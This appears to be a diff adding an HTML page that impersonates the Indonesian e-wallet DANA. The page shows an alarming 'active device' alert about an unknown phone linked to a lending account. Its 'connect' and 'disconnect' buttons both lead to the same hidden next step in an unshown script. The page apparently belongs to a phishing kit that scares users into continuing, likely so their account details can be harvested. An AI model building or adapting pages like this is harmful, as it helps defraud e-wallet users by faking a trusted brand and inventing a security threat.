@@ -1,0 +1,88 @@
+<html>
+	<head>
+		<title>DANA</title>
+		<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+		<link rel="stylesheet" href="assets/common/css/global.css">
+		<link rel="stylesheet" href="assets/common/css/intro.css">
+		<script src="assets/lib/jquery/jquery.js"></script>
+		<script src="assets/lib/momentjs/moment.js"></script>
+		<script>
+			const module = {};
+		</script>
+		<script type="module" src="assets/common/js/intro.js"></script>
+		<script type="module" src="https://unpkg.com/ionicons@7.1.0/dist/ionicons/ionicons.esm.js"></script>
+        <script nomodule src="https://unpkg.com/ionicons@7.1.0/dist/ionicons/ionicons.js"></script>
+	</head>
+	<body>
+		<div style="background-color: #EEEEEE; width: 100%; height: 100%; display: flex; flex-direction: column; align-items: center;">
+			<div style="position: fixed; left: 0; top: 0; width: 100%; height: 200px; background-color: #118EEA;"></div>
+			<div style="position: fixed; left: 0; top: 0; width: 100%; height: 100%; display: flex; flex-direction: column; overflow: scroll;">
+				<div style="width: 100%; height: 50px; display: flex; flex-direction: row; align-items: center;">
+					<div style="width: 30px; height: 50px; display: flex; justify-content: center; align-items: center;">
+					    <ion-icon name="chevron-back" style="color: #ffffff; font-size: 20px;"></ion-icon>
+				    </div>
+				    <div style="color: #ffffff; font-size: 14px;">Rincian Aktivitas</div>
+				</div>
+				<div style="box-shadow: 0 0 10px 5px rgba(0,0,0,.2); border-radius: 5px; margin-top: 50px; width: calc(100% - 40px); margin-left: 20px; margin-right: 20px; display: flex; flex-direction: column;">
+					<div style="background-color: #118EEA; color: #ffffff; width: calc(100% - 20px); height: 30px; border-top-left-radius: 5px;  border-top-right-radius: 5px;  font-size: 12px; display: flex; flex-direction: row; justify-content: space-between; align-items: center; padding-left: 10px; padding-right: 10px;">
+						<div style="display: flex; flex-direction: row; align-items: center;">
+						    <ion-icon name="warning" style="color: #f1c40f; font-size: 15px; margin-right: 5px;"></ion-icon>
+						    <b>Perangkat Aktif</b>
+						</div>
+						<ion-icon name="information-circle" style="color: #ffffff; font-size: 15px;"></ion-icon>
+					</div>
+					<div style="background-color: #ffffff; border-bottom-left-radius: 5px; border-bottom-right-radius: 5px; padding: 10px; display: flex; flex-direction: column;">
+						<div style="margin-top: -5px; width: 100%; display: flex; flex-direction: row; justify-content: space-between; align-items: center;">
+							<div style="display: flex; flex-direction: row; align-items: center;">
+							    <div style="color: #000000; font-size: 12px;">Akun Terhubung</div>
+							</div>
+							<div style="display: flex; flex-direction: row; align-items: center;">
+								<img src="assets/common/img/img5.png" style="width: 15px; height: 15px; object-fit: fill; margin-left: 5px; margin-right: 2px; border-radius: 2px;">
+							    <div style="color: #000000; font-size: 12px;">PinjamDuit</div>
+							</div>
+						</div>
+						<div style="margin-top: 5px; width: 100%; display: flex; flex-direction: row; justify-content: space-between; align-items: center;">
+							<div style="color: #000000; font-size: 12px;">Waktu</div>
+							<div id="date" style="color: #000000; font-size: 12px;"></div>
+						</div>
+						<div style="margin-top: 5px; width: 100%; display: flex; flex-direction: row; justify-content: space-between; align-items: center;">
+							<div style="color: #000000; font-size: 12px;">Sumber</div>
+							<div style="color: #000000; font-size: 12px;">DANA</div>
+						</div>
+						<div style="margin-top: 5px; width: 100%; display: flex; flex-direction: row; justify-content: space-between; align-items: center;">
+							<div style="color: #000000; font-size: 12px;">Perangkat</div>
+							<div style="color: #000000; font-size: 12px;">OPPO A18</div>
+						</div>
+					</div>
+				</div>
+				<div style="display: flex; flex-direction: row; justify-content: center; align-items: center; margin-top: 20px;">
+					<div style="color: #888888; font-size: 12px;"><b>Dilindungi Oleh</b></div>
+					<img src="assets/common/img/img1.jpg" style="margin-left: 5px; width: 100px; height: 20px; object-fit: fill;">
+				</div>
+				<div style="padding: 15px; background-color: #ffffff; box-shadow: 0 0 10px 5px rgba(0,0,0,.2); border-radius: 5px; margin-top: 20px; margin-bottom: 400px; width: calc(100% - 70px); margin-left: 20px; margin-right: 20px; display: flex; flex-direction: column;">
+					<div style="width: 100%; display: flex; flex-direction: row; align-items: center;">
+						<div style="color: #464646; font-size: 12px;"><b>Rekomendasi Keamanan</b></div>
+						<ion-icon name="chevron-down" style="color: #464646; font-size: 20px;"></ion-icon>
+					</div>
+					<div style="width: 100%; display: flex; flex-direction: row; margin-top: 10px;">
+						<ion-icon name="checkmark-circle" style="color: green; font-size: 15px;"></ion-icon>
+						<div style="margin-left: 10px; display: flex; flex-direction: column;">
+							<div style="color: #464646; font-size: 12px;"><b>Aktivasi DANA Viz</b></div>
+							<div style="color: #464646; font-size: 10px;">Keamanan bertransaksi dengan verifikasi wajah.</div>
+						</div>
+					</div>
+				</div>
+				<div style="height: 500px;"></div>
+			</div>
+			<div style="background-color: #ffffff; border-top-left-radius: 5px; border-top-right-radius: 5px; box-shadow: 0 0 5px 2px rgba(0,0,0,.2); position: fixed; left: 0; bottom: 0; width: calc(100% - 30px); display: flex; flex-direction: column; align-items: center; padding: 15px;">
+				<div style="color: #000000; font-size: 12px;">Riwayat akun terhubung?</div>
+				<div id="btn1" onclick="module.next()" style="width: 100%; height: 40px; border-radius: 5px; margin-top: 20px; font-size: 14px; display: flex; justify-content: center; align-items: center;">
+					<b>HUBUNGKAN</b>
+				</div>
+				<div id="btn2" onclick="module.next()" style="width: 100%; height: 40px; border-radius: 5px; margin-top: 10px; margin-bottom: 50px; font-size: 14px; display: flex; justify-content: center; align-items: center;">
+					<b>PUTUSKAN</b>
+				</div>
+			</div>
+		</div>
+	</body>
+</html>
